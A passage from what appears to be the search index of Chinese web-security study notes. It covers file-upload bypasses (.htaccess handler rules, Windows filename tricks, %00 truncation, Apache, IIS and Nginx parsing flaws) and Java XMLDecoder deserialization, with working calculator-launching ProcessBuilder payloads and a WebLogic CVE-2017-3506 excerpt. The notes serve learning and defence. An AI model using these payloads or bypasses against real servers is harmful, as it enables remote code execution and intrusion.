\u91cc\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f5c\u4e3a\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u7528\u6765\u63a7\u5236\u6240\u5728\u76ee\u5f55\u7684\u8bbf\u95ee\u6743\u9650\u4ee5\u53ca\u89e3\u6790\u8bbe\u7f6e\u3002\u901a\u8fc7\u8bbe\u7f6e\u53ef\u4ee5\u5c06\u8be5\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u4f5c\u4e3aphp\u6587\u4ef6\u6765\u89e3\u6790, .htaccess \u53ef\u4ee5\u5199\u5165Apache\u914d\u7f6e\u4fe1\u606f\uff0c\u6539\u53d8\u5f53\u524d\u76ee\u5f55\u4ee5\u53ca\u5b50\u76ee\u5f55\u7684 Apache \u914d\u7f6e\u3002 \u6b64\u65b9\u6cd5\u7ed5\u8fc7\u9700\u8981\u914d\u7f6e\u4e0a\u5141\u8bb8 .htaccess\u751f\u6548 Apache\u5f00\u542f rewrite \u6a21\u5757 Apache\u914d\u7f6e\u6587\u4ef6\u4e3a AllowOverride All \uff08\u9ed8\u8ba4\u4e3aNone\uff09 \u4ee5\u4e0b\u914d\u7f6e\u53ef\u4ee5\u8ba9 shell.jpg \u4f5c\u4e3a php \u811a\u672c\u89e3\u6790 <FilesMatch \".jpg\"> SetHandler application/x-httpd-php </FilesMatch> AddType application/x-httpd-php .gif","title":".htaccess \u7ed5\u8fc7"},{"location":"web/file_upload/#windows","text":"\u5229\u7528 window \u5bf9\u4e8e\u6587\u4ef6\u548c\u6587\u4ef6\u540d\u7684\u9650\u5236\uff0c\u4ee5\u4e0b\u5b57\u7b26\u653e\u5728\u7ed3\u5c3e\u65f6\uff0c\u4e0d\u7b26\u5408\u64cd\u4f5c\u7cfb\u7edf\u7684\u547d\u540d\u89c4\u8303\uff0c\u5728\u6700\u540e\u751f\u6210\u6587\u4ef6\u65f6\uff0c\u5b57\u7b26\u4f1a\u88ab\u81ea\u52a8\u53bb\u9664\u3002 \u4e0a\u4f20\u6587\u4ef6\u540d \u670d\u52a1\u5668\u6587\u4ef6\u540d \u8bf4\u660e file.php[\u7a7a\u683c] file.php file.php[.] file.php \u4efb\u610f\u6570\u91cf.\u5747\u53ef file.php[%80-%99] file.php BurpSuite\u6293\u5305\uff0c\u5728\u6587\u4ef6\u540d\u7ed3\u5c3e\u8f93%80\uff0c CTRL+SHIFT+U\u8fdb\u884cURL-DECODE\uff0c \u6216\u8005\u589e\u52a0\u4e00\u4e2a\u7a7a\u683c\uff0c\u518d\u5728\u5728HEX\u89c6\u56fe\u4e3a\u628a20\u4fee\u6539\u4e3a80 file.php::$DATA file.php \u6587\u4ef6\u5185\u5bb9\u4e0d\u53d8 file.php::$DATA...... file.php \u6587\u4ef6\u5185\u5bb9\u4e0d\u53d8","title":"\u64cd\u4f5c\u7cfb\u7edf\u7279\u6027\u7ed5\u8fc7(windows)"},{"location":"web/file_upload/#-_2","text":"%00\u622a\u65ad php < 5.3.34 \u53ef\u7528 %00 \u662f chr(0)\uff0c\u5b83\u4e0d\u662f\u7a7a\u683c\uff0c\u662fNULL\uff0c\u7a7a\u5b57\u7b26\u3002 \u5f53\u7a0b\u5e8f\u5728\u8f93\u51fa\u542b\u6709 chr(0) \u53d8\u91cf\u65f6\uff0cchr(0) \u540e\u9762\u7684\u6570\u636e\u4f1a\u88ab\u505c\u6b62\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u8bef\u628a\u5b83\u5f53\u505a\u7ed3\u675f\u7b26\uff0c\u540e\u9762\u7684\u6570\u636e\u76f4\u63a5\u5ffd\u7565\uff0c\u8fd9\u5c31\u5bfc\u81f4\u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u3002 \u5728\u6587\u4ef6\u4e0a\u4f20\u4e2d\uff0c\u5229\u7528 %00 \u622a\u65ad\uff0c\u5728\u6587\u4ef6\u6269\u5c55\u540d\u9a8c\u8bc1\u65f6\uff0c\u662f\u53d6\u6587\u4ef6\u7684\u6269\u5c55\u540d\u6765\u505a\u9a8c\u8bc1\uff0c\u4f46\u662f\u6700 \u540e\u6587\u4ef6\u4fdd\u5b58\u5728\u672c\u5730\u65f6\uff0c%00 \u4f1a\u622a\u65ad\u6587\u4ef6\u540d\uff0c\u53ea\u4fdd\u5b58 %00 \u4e4b\u524d\u7684\u5185\u5bb9\u3002","title":"\u670d\u52a1\u7aef\u6587\u4ef6\u6269\u5c55\u540d\u9a8c\u8bc1-\u9ed1\u540d\u5355\u7ed5\u8fc7"},{"location":"web/file_upload/#_12","text":"","title":"\u4e2d\u95f4\u4ef6\u6587\u4ef6\u89e3\u6790\u6f0f\u6d1e"},{"location":"web/file_upload/#apache","text":"Apache \u89e3\u6790\u6587\u4ef6\u89c4\u5219\u65f6\u4ece\u53f3\u5230\u5de6. \u4f8b\u5982 shell.php.gix.ccc, apache \u4f1a\u5148\u8bc6\u522b ccc, ccc \u4e0d\u88ab\u8bc6\u522b, \u5219\u8bc6\u522b gix, \u4ee5\u6b64\u7c7b\u63a8, \u6700\u540e\u4f1a\u88ab\u8bc6\u522b\u4e3a php \u6267\u884c. https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html","title":"Apache \u89e3\u6790\u6f0f\u6d1e"},{"location":"web/file_upload/#iis60","text":"\u76ee\u5f55\u89e3\u6790 \u76ee\u5f55\u540d\u4e3a .asp \u3001 .asa \u3001 .cer \uff0c\u5219\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u90fd\u4f1a\u88ab\u4f5c\u4e3aASP\u89e3\u6790\u3002 url/test.asp/shelljpg \u4f1a\u88ab\u5f53\u4f5casp\u811a\u672c\u8fd0\u884c\u3002 \u6587\u4ef6\u89e3\u6790 \u6587\u4ef6\u540d\u4e2d\u5206\u53f7\u540e\u4e0d\u88ab\u89e3\u6790\uff0c\u4f8b\u5982 .asp; \u3001 .asa; \u3001 .cer; \u3002 url/test.asp;shell.jpg \u4f1a\u88ab\u5f53\u4f5casp\u811a\u672c\u8fd0\u884c\u3002 \u6587\u4ef6\u7c7b\u578b\u89e3\u6790 .asa \uff0c .cer \uff0c .cdx \u90fd\u4f1a\u88ab\u4f5c\u4e3a asp \u6587\u4ef6\u6267\u884c\u3002 url/shell.asa \u4f1a\u88ab\u4f5c\u4e3aasp\u6587\u4ef6\u6267\u884c\u3002","title":"IIS6.0 \u89e3\u6790\u6f0f\u6d1e"},{"location":"web/file_upload/#nginx","text":"PHP+Nginx \u9ed8\u8ba4\u662f\u4ee5cgi\u7684\u65b9\u5f0f\u53bb\u8fd0\u884c\uff0c\u5f53\u7528\u6237\u914d\u7f6e\u4e0d\u5f53\uff0c\u4f1a\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u88ab\u5f53\u4f5cphp\u53bb\u89e3\u6790\u3002 \u5229\u7528\u6761\u4ef6 \u4ee5 FastCGl \u8fd0\u884c cgi.fix_pathinfo = 1 (\u5168\u7248\u672cPHP\u9ed8\u8ba4\u4e3a\u5f00\u542f) \u6ee1\u8db3\u4ee5\u4e0a\u6761\u4ef6\u65f6, \u8bbf\u95ee url/shell.jpg/shellphp \u65f6\uff0cshell.jpg \u4f1a\u88ab\u5f53\u4f5c php \u53bb\u6267\u884c\u3002","title":"Nginx \u89e3\u6790\u6f0f\u6d1e"},{"location":"web/file_upload/#nginx-cve-2013-4547","text":"\u5f71\u54cd\u7248\u672c : Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 \u5229\u7528\u8fc7\u7a0b : \u4e0a\u4f20\u4e00\u4e2a shell.jpg \u6587\u4ef6\uff0c\u6ce8\u610f\u6700\u540e\u4e3a\u7a7a\u683c \u8bbf\u95ee url/shell.jpg[0x20][0x00].php \uff08\u4e24\u4e2a\u4e2d\u62ec\u53f7\u4e2d\u7684\u6570\u5b57\u662f\u7528Burp\u5728Hex\u754c\u9762\u4e2d\u66f4\u6539)","title":"Nginx \u6587\u4ef6\u540d\u903b\u8f91\u6f0f\u6d1e\uff08CVE-2013-4547\uff09"},{"location":"web/file_upload/#_13","text":"\u670d\u52a1\u7aef\u6587\u4ef6\u6269\u5c55\u540d\u4f7f\u7528\u767d\u540d\u5355\u68c0\u6d4b+\u6587\u4ef6\u540d\u91cd\u547d\u540d \u5bf9\u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u68c0\u6d4b \u5bf9\u4e2d\u95f4\u4ef6\u505a\u5b89\u5168\u7684\u914d\u7f6e","title":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u9632\u5fa1"},{"location":"web/file_upload/#_14","text":"","title":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7ec3\u4e60"},{"location":"web/file_upload/#pass-01","text":"\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u6587\u4ef6\u4e0a\u4f20\u9650\u5236\u4e3a\u5ba2\u6237\u7aef\u9650\u5236, \u53ef\u4ee5\u672c\u5730\u5220\u9664\u5bf9 checkFile \u51fd\u6570\u7684\u8c03\u7528\u5b9e\u73b0\u7ed5\u8fc7 \u5c06\u6587\u4ef6\u540e\u7f00\u6539\u4e3a jpg \u4e0a\u4f20, \u901a\u8fc7 Burpsuite \u6293\u5305\u4fee\u6539\u6587\u4ef6\u540d\u4e5f\u53ef\u4ee5\u5b9e\u73b0\u7ed5\u8fc7","title":"Pass-01"},{"location":"web/java_deserialization/","text":"\u5e8f\u5217\u5316\u4e0e\u53cd\u5e8f\u5217\u5316 Java\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u4ee3\u7801\u539f\u7406\u4ee5\u53ca\u5de5\u4f5c\u6d41\u7a0b Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5f62\u6210\u539f\u56e0 Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u6316\u6398\u601d\u8def \u5e8f\u5217\u5316\u662f\u5c06Java\u5bf9\u8c61\u8f6c\u6362\u6210\u5b57\u8282\u6d41\u7684\u8fc7\u7a0b, \u800c\u53cd\u5e8f\u5217\u5316\u662f\u5c06\u5b57\u8282\u6d41\u8f6c\u6362\u6210Java\u5bf9\u8c61\u7684\u8fc7\u7a0b \u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u66f4\u65b9\u4fbf\u8fdb\u884c\u6570\u636e\u548c\u5bf9\u8c61\u7684\u5b58\u50a8, \u7f51\u7edc\u4f20\u8f93 \u5e8f\u5217\u5316\u539f\u56e0 \u5185\u5b58\u4e2d\u5b58\u5728\u5927\u91cf\u7684\u5bf9\u8c61, \u4f1a\u8ba9\u5185\u5b58\u8d1f\u62c5\u8fc7\u91cd, \u50cfsession\u5bf9\u8c61, \u5982\u679c\u6709\u6570\u4ee5\u4e07\u8ba1\u7528\u6237\u5e76\u53d1\u8bbf\u95ee, \u90a3\u5c31\u4f1a\u540c\u6837\u51fa\u73b0\u6570\u4ee5\u4e07\u8ba1\u7684 session\u5bf9\u8c61, \u8fd9\u65f6Web\u5e94\u7528\u4f1a\u5c06\u4e00\u4e9bsession\u5148\u5e8f\u5217\u5316\u5b58\u50a8\u5728\u786c\u76d8\u4e2d, \u7b49\u9700\u8981\u4f7f\u7528\u7684\u65f6\u5019, \u518d\u5c06\u5176\u53cd\u5e8f\u5217\u5316, \u8fd8\u539f\u5230\u5185\u5b58\u4e2d, \u8282\u7ea6\u8ba1\u7b97\u673a\u5185\u5b58\u8d44\u6e90 \u5728\u8fdb\u884c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u65f6, \u9700\u8981\u5728\u7f51\u7edc\u4e0a\u4f20\u8f93 JavaBean \u7684\u5bf9\u8c61, \u800c\u7f51\u7edc\u4e0a\u53ea\u5141\u8bb8\u4e8c\u8fdb\u5236\u5f62\u5f0f\u7684\u6570\u636e\u8fdb\u884c\u4f20\u8f93, \u8fd9\u7b97\u662f\u9700\u8981\u7528\u5230\u5e8f\u5217\u5316\u6280\u672f XMLEncoder encoder import java.beans.XMLEncoder ; import java.io.IOException ; import java.util.ArrayList ; import java.util.HashMap ; public class encoder { public static void main ( String [] args ) throws IOException , InterruptedException { HashMap < String , Object > map = new HashMap <> (); //\u521b\u5efaHashMap\u6563\u5217\u96c6 map . put ( \"name\" , \"Rookie\" ); //key Name \u653e\u5165\u5b57\u7b26\u4e32 map . put ( \"LV\" , 1 ); //key LV \u653e\u5165\u6570\u503c ArrayList < String > arrayList = new ArrayList < String > (); arrayList . add ( \"Sword\" ); arrayList . add ( \"Shield\" ); map . put ( \"Equipment\" , arrayList ); //key Equipment \u653e\u5165\u53ef\u52a8\u6001\u4fee\u6539\u7684\u6570\u7ec4 System . out . println ( \"map = \" + map ); //map = {Equipment=[Sword, Shield], LV=1, Name=Rookie} XMLEncoder xmlEncoder = new XMLEncoder ( System . out ); xmlEncoder . writeObject ( map ); //\u5b9e\u4f8b\u5316 XMLEncoder \u5bf9\u8c61\u5e76\u5c06 map \u6563\u5217\u96c6\u5e8f\u5217\u5316\u7f16\u7801 xmlEncoder . close (); } } decoder import java.beans.XMLDecoder ; import java.io.IOException ; import java.io.StringBufferInputStream ; import javax.sql.rowset.spi.XmlReader ; public class decoder { public static void main ( String [] args ) throws IOException , InterruptedException { String s = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" + \"<java version=\\\"11.0.13\\\" class=\\\"java.beans.XMLDecoder\\\">\\n\" + \"<Object class=\\\"java.util.HashMap\\\">\\n\" + \"<void method=\\\"put\\\">\\n\" + \"<string>Equipment</string>\\n\" + \"<object class=\\\"java.util.ArrayList\\\">\\n\" + \"<void method=\\\"add\\\">\\n\" + \"<string>Sword</string>\\n\" + \"</void>\\n\" + \"<void method=\\\"add\\\">\\n\" + \"<string>Shield</string>\\n\" + \"</void>\\n\" + \"</object>\\n\" + \"</void>\\n\" + \"<void method=\\\"put\\\">\\n\" + \"<string>LV</string>\\n\" + \"<int>1</int>\\n\" + \"</void>\\n\" + \"<void method=\\\"put\\\">\\n\" + \"<string>Name</string>\\n\" + \"<string>Rookie</string>\\n\" + \"</void>\\n\" + \"</object>\\n\" + \"</java>\" ; StringBufferInputStream stringBufferInputStream = new StringBufferInputStream ( s ); XMLDecoder xmlDecoder = new XMLDecoder ( stringBufferInputStream ); Object o = xmlDecoder . readObject (); System . out . println ( o ); } } decoder_mod import java.beans.XMLDecoder ; import java.io.IOException ; import java.io.StringBufferInputStream ; import javax.sql.rowset.spi.XmlReader ; public class decoder { public static void main ( String [] args ) throws IOException , InterruptedException { String s = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" + \"<java version=\\\"11.0.13\\\" class=\\\"java.beans.XMLDecoder\\\">\\n\" + \"<Object class=\\\"java.util.HashMap\\\">\\n\" + \"<array class=\\\"java.lang.String\\\" length=\\\"1\\\">\\n\" + \"<void index=\\\"0\\\"><string>calc</string></void>\\n\" + \"</array>\\n\" + \"<void method=\\\"start\\\">\\n\" + \"</void>\\n\" + \"</object>\\n\" + \"</java>\" ; StringBufferInputStream stringBufferInputStream = new StringBufferInputStream ( s ); XMLDecoder xmlDecoder = new XMLDecoder ( stringBufferInputStream ); Object o = xmlDecoder . readObject (); System . out . println ( o ); } } \u53cd\u5e8f\u5217\u5316\u539f\u7406 Java\u5e94\u7528\u5bf9\u7528\u6237\u8f93\u5165\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4, \u5373\u4e0d\u53ef\u4fe1\u6570\u636e\u505a\u4e86\u53cd\u5e8f\u5217\u5316\u5904\u7406, \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u6076\u610f\u8f93\u5165, \u8ba9\u53cd\u5e8f\u5217\u5316\u4ea7\u751f\u975e\u9884\u671f\u7684\u5bf9\u8c61, \u5c31\u6709\u53ef\u80fd\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6316\u6398 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u591a\u4f7f\u7528\u767d\u76d2\u5ba1\u8ba1\u65b9\u6cd5\u6765\u6316\u6398, \u9ed1\u76d2\u6316\u6398\u96be\u5ea6\u8fc7\u9ad8 \u5728\u4ee3\u7801\u4e2d\u641c\u7d22\u67d0\u4e9b\u9ad8\u5371\u51fd\u6570, \u5982 XMLDecoder.readObject, Yaml.load, XStream.fromXML \u7b49, \u786e\u5b9a\u4e86\u53cd\u5e8f\u5217\u5316\u8f93\u5165\u70b9\u540e, \u518d\u89c2\u5bdf\u5e94\u7528\u7684 ClassPath \u4e2d\u662f\u5426\u5305\u542b ApacheCommons Collections \u7b49\u5371\u9669\u5e93 \u82e5\u5305\u542b\u5371\u9669\u5e93, \u5219\u4f7f\u7528 ysoserial \u7b49\u5f00\u6e90\u5de5\u5177\u8fdb\u884c\u653b\u51fb\u590d\u73b0 \u82e5\u4e0d\u5305\u542b\u5371\u9669\u5e93, \u5219\u67e5\u770b\u4e00\u4e9b\u6d89\u53ca\u547d\u4ee4, \u4ee3\u7801\u6267\u884c\u7684\u4ee3\u7801\u533a\u57df, \u9632\u6b62\u56e0\u4ee3\u7801\u4e0d\u4e25\u8c28, \u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u4ea7\u751f \u67e5\u770b\u9ad8\u5371\u51fd\u6570\u7684\u8f93\u5165\u70b9\u662f\u5426\u53ef\u63a7 Java\u7cfb\u7edf\u547d\u4ee4\u6267\u884c Java\u4e2d\u7684Runtime\u7c7b\u548cProcessBuilder\u7c7b\u7684\u4f5c\u7528 \u4f7f\u7528Java\u4ee3\u7801\u7f16\u5199\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684java\u6587\u4ef6 \u8c03\u7528\u7cfb\u7edf\u8ba1\u7b97\u5668 java.lang.Runtime //\u5e38\u89c4\u5199\u6cd5 Runtime runtime = Runtime . getRuntime (); runtime . exec ( \"open /Applications/Calculator.app\" ); //Java\u81ea\u5e26\u7684\u7c7b java . lang . Runtime runtime = java . lang . Runtime . getRuntime (); runtime . exec ( new String [] { \"/bin/bash\" , \"-c\" , \"open -a Calculator\" }); //\u5e26\u56de\u663e\u7684\u547d\u4ee4\u884c Runtime runtime = Runtime . getRuntime (); Process start = runtime . exec ( \"ip a\" ); InputStream inputStream = start . getInputStream (); byte [] res = new byte [ 1024 ] ; inputStream . read ( res ); System . out . println ( new Sting ( res )); java.lang.ProcessBuilder //Java \u6781\u7b80\u5199\u6cd5 new ProcessBuilder ( \"/bin/bash\" , \"-c\" , \"open -a Calculator\" ). start (); //Java \u81ea\u5e26\u7684\u7c7b new java . lang . ProcessBuilder ( new String [] { \"/bin/bash\" , \"-c\" , \"open -a Calculator\" }). start (); //\u6807\u51c6\u5199\u6cd5 ProcessBuilder processBuilder = new ProcessBuilder ( \"/bin/bash\" , \"-c\" , \"open -a Calculator\" ); Process start = processBuilder . start (); Windows calc \u8c03\u7528\u8ba1\u7b97\u5668 cmd /c calc \u901a\u8fc7CMD\u547d\u4ee4\u8c03\u7528calc, \u6267\u884c\u5b8c\u6210\u540e\u5173\u95ed\u547d\u4ee4\u884c\u7a97\u53e3 cmd /k calc \u901a\u8fc7CMD\u547d\u4ee4\u8c03\u7528calc, \u6267\u884c\u5b8c\u540e\u4e0d\u4e0d\u5173\u95ed\u547d\u4ee4\u884c\u7a97\u53e3 import java.io.IOException ; public class runtime { public static void main ( String [] args ) throws IOException { Runtime runtime = Runtime . getRuntime (); runtime . exec ( \"calc\" ); System . out . println ( runtime ); } } MacOS \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u4f4d\u7f6e /Applications/Calculator.app/Contents/MacOS/Calculator open /Applications/Calculator.app \u4e0d\u540c\u7248\u672c\u4f4d\u7f6e\u53ef\u80fd\u4e0d\u540c /System/Applications/Calculator.app/Contents/MacOS/Calculator open /System/Applications/Calculator.app \u4f7f\u7528 bash \u8c03\u7528 open -a Calculator \u547d\u4ee4 bash -c open -a Calculator /bin/bash -c open -a Calculator \u53cd\u5e8f\u5217\u5316Payload\u6784\u9020 XML \u5355\u53c2\u6570 Payload \u6784\u9020 new java . lang . ProcessBuilder ( \"/Applications/Calculator.app/Contents/MacOS/Calculator\" ). start () <?xml version=\"1.0\" encoding=\"UTF-8\"?> <java version= \"1.8.0_261\" class= \"java.beans.XMLDecoder\" > <object class= \"java.lang.ProcessBuilder\" > <array class= \"java.lang.String\" length= \"1\" > <void index= \"0\" > <string> /Applications/Calculator.app/Contents/MacOS/Calculator </string> </void> </array> <void method= \"start\" ></void> </object> </java> XML \u591a\u53c2\u6570 Payload \u6784\u9020 new ProcessBuilder ( \"/bin/bash\" , \"-c\" , \"open -a Calculator\" ). start (); <?xml version=\"1.0\" encoding=\"UTF-8\"?> <java version= \"1.8.0_261\" class= \"java.beans.XMLDecoder\" > <object class= \"java.lang.ProcessBuilder\" > <array class= \"java.lang.String\" length= \"3\" > <void index= \"0\" > <string> /bin/bash </string> </void> <void index= \"1\" > <string> c </string> </void> <void index= \"2\" > <string> open -a Calculator </string> </void> </array> <void method= \"start\" ></void> </object> </java> Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790 CVE-2017-3506 \u6f0f\u6d1e\u7b80\u4ecb \u5f71\u54cd\u7248\u672c: Weblogic 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2 \u6f0f\u6d1e\u4f4d\u7f6e: wls-wsat.war \u6f0f\u6d1e URL: /wls-wsat/CoordinatorPortType (POST) \u6f0f\u6d1e\u672c\u8d28: \u6784\u9020 SOAP (XML) \u683c\u5f0f\u7684\u8bf7\u6c42, \u5728\u89e3\u6790\u7684\u8fc7\u7a0b\u4e2d\u5bfc\u81f4 XMLDecoder \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u4f7f\u7528 JD-GUI \u53cd\u7f16\u8bd1 jar/root/Oracle/Middleware/wlserver_10.3/lib/weblogic.jar weblogic.wess.jaxws.workcontent.WorkContextServerTube public NextAction processRequest ( Packet paramPacket ) { this . isUseOldFormat = false ; if ( paramPacket . getMessage () != null ) { HeaderList headerList = paramPacket . getMessage (). getHeaders (); Header header1 = headerList . get ( WorkAreaConstants . WORK_AREA_HEADER , true ); if ( header1 != null ) { readHeaderOld ( header1 ); this . isUseOldFormat = true ; } Header header2 = headerList . get ( this . JAX_WS_WORK_AREA_HEADER , true ); if ( header2 != null ) { readHeader ( header2 ); } return super . processRequest ( paramPacket ); } } Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u57fa\u672c\u539f\u7406 \u4f7f\u7528EXP\u548c\u81ea\u52a8\u5316\u96c6\u6210\u5de5\u5177\u8fdb\u884cWeblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u6f0f\u6d1e\u5229\u7528 Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u66f4\u65b0\u8865\u4e01\u548c\u7ed5\u8fc7\u539f\u7406 \u53cd\u5e8f\u5217\u5316\u5b9e\u6218\u4e2d\u7684\u5229\u7528\u65b9\u6cd5 Weblogic CVE-2019-2725\u6f0f\u6d1e\u7684\u5f62\u6210\u539f\u56e0 \u4f7f\u7528EXP\u548c\u81ea\u52a8\u5316\u96c6\u6210\u5de5\u5177\u8fdb\u884c CVE-2019-2725\u6f0f\u6d1e\u7684\u5229\u7528 Apache Shiro 1.2.4 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5f62\u6210\u539f\u56e0 \u4f7f\u7528\u81ea\u52a8\u5316\u96c6\u6210\u5de5\u5177\u8fdb\u884cShiro\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5229\u7528 Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5f62\u6210\u539f\u56e0 \u4f7f\u7528\u811a\u672c\u548c\u81ea\u52a8\u5316\u96c6\u6210\u5de5\u5177\u8fdb\u884cJboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u6f0f\u6d1e\u5229\u7528","title":"Java deserialization"},{"location":"web/java_deserialization/#_1","text":"Java\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u4ee3\u7801\u539f\u7406\u4ee5\u53ca\u5de5\u4f5c\u6d41\u7a0b Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u5f62\u6210\u539f\u56e0 Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u6316\u6398\u601d\u8def \u5e8f\u5217\u5316\u662f\u5c06Java\u5bf9\u8c61\u8f6c\u6362\u6210\u5b57\u8282\u6d41\u7684\u8fc7\u7a0b, \u800c\u53cd\u5e8f\u5217\u5316\u662f\u5c06\u5b57\u8282\u6d41\u8f6c\u6362\u6210Java\u5bf9\u8c61\u7684\u8fc7\u7a0b \u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u66f4\u65b9\u4fbf\u8fdb\u884c\u6570\u636e\u548c\u5bf9\u8c61\u7684\u5b58\u50a8, \u7f51\u7edc\u4f20\u8f93","title":"\u5e8f\u5217\u5316\u4e0e\u53cd\u5e8f\u5217\u5316"},{"location":"web/java_deserialization/#_2","text":"\u5185\u5b58\u4e2d\u5b58\u5728\u5927\u91cf\u7684\u5bf9\u8c61, \u4f1a\u8ba9\u5185\u5b58\u8d1f\u62c5\u8fc7\u91cd, \u50cfsession\u5bf9\u8c61, \u5982\u679c\u6709\u6570\u4ee5\u4e07\u8ba1\u7528\u6237\u5e76\u53d1\u8bbf\u95ee, \u90a3\u5c31\u4f1a\u540c\u6837\u51fa\u73b0\u6570\u4ee5\u4e07\u8ba1\u7684 session\u5bf9\u8c61, \u8fd9\u65f6Web\u5e94\u7528\u4f1a\u5c06\u4e00\u4e9bsession\u5148\u5e8f\u5217\u5316\u5b58\u50a8\u5728\u786c\u76d8\u4e2d, \u7b49\u9700\u8981\u4f7f\u7528\u7684\u65f6\u5019, \u518d\u5c06\u5176\u53cd\u5e8f\u5217\u5316, \u8fd8\u539f\u5230\u5185\u5b58\u4e2d, \u8282\u7ea6\u8ba1\u7b97\u673a\u5185\u5b58\u8d44\u6e90 \u5728\u8fdb\u884c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u65f6, \u9700\u8981\u5728\u7f51\u7edc\u4e0a\u4f20\u8f93 JavaBean \u7684\u5bf9\u8c61, \u800c\u7f51\u7edc\u4e0a\u53ea\u5141\u8bb8\u4e8c\u8fdb\u5236\u5f62\u5f0f\u7684\u6570\u636e\u8fdb\u884c\u4f20\u8f93, \u8fd9\u7b97\u662f\u9700\u8981\u7528\u5230\u5e8f\u5217\u5316\u6280\u672f","title":"\u5e8f\u5217\u5316\u539f\u56e0"},{"location":"web/java_deserialization/#xmlencoder","text":"","title":"XMLEncoder"},{"location":"web/java_deserialization/#encoder","text":"import java.beans.XMLEncoder ; import java.io.IOException ; import java.util.ArrayList ; import java.util.HashMap ; public class encoder { public static void main ( String [] args ) throws IOException , InterruptedException { HashMap < String , Object > map = new HashMap <> (); //\u521b\u5efaHashMap\u6563\u5217\u96c6 map . put ( \"name\" , \"Rookie\" ); //key Name \u653e\u5165\u5b57\u7b26\u4e32 map . put ( \"LV\" , 1 ); //key LV \u653e\u5165\u6570\u503c ArrayList < String > arrayList = new ArrayList < String > (); arrayList . add ( \"Sword\" ); arrayList . add ( \"Shield\" ); map . put ( \"Equipment\" , arrayList ); //key Equipment \u653e\u5165\u53ef\u52a8\u6001\u4fee\u6539\u7684\u6570\u7ec4 System . out . println ( \"map = \" + map ); //map = {Equipment=[Sword, Shield], LV=1, Name=Rookie} XMLEncoder xmlEncoder = new XMLEncoder ( System . out ); xmlEncoder . writeObject ( map ); //\u5b9e\u4f8b\u5316 XMLEncoder \u5bf9\u8c61\u5e76\u5c06 map \u6563\u5217\u96c6\u5e8f\u5217\u5316\u7f16\u7801 xmlEncoder . close (); } }","title":"encoder"},{"location":"web/java_deserialization/#decoder","text":"import java.beans.XMLDecoder ; import java.io.IOException ; import java.io.StringBufferInputStream ; import javax.sql.rowset.spi.XmlReader ; public class decoder { public static void main ( String [] args ) throws IOException , InterruptedException { String s = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\" + \"<java version=\\\"11.0.13\\\" class=\\\"java.beans.XMLDecoder\\\">\\n\" + \"<Object class=\\\"java.util.HashMap\\\">\\n\" + \"<void method=\\\"put\\\">\\n\" + \"<string>Equipment</string>\\n\" + \"<object class=\\\"java.util.ArrayList\\\">\\n\" + \"<void method=\\\"add\\\">\\n\" + \"<string>Sword</string>\\n\" + \"</void>\\n\" + \"<void method=\\\"add\\\">\\n\" + \"<string>Shield</string>\\n\" + \"</void>\\n\" + \"</object>\\n\" + \"</void>\\n\" + \"<void method=\\\"put\\\">\\n\" + \"<string>LV</string>\\n\" + \"<int>1</int>\\n\" + \"</void>\\n\" + \"<void method=\\\"put\\\">\\n\" + \"<string>Name</string>\\n\" + \"<string>Rookie</string>\\n\" + \"</void>\\n\" + \"</object>\\n\" + \"</java>\" ; StringBufferInputStream stringBufferInputStream = new StringBufferInputStream ( s ); XMLDecoder xmlDecoder = new XMLDecoder ( stringBufferInputStream ); Object o = xmlDecoder . readObject (); System . out . println ( o ); } 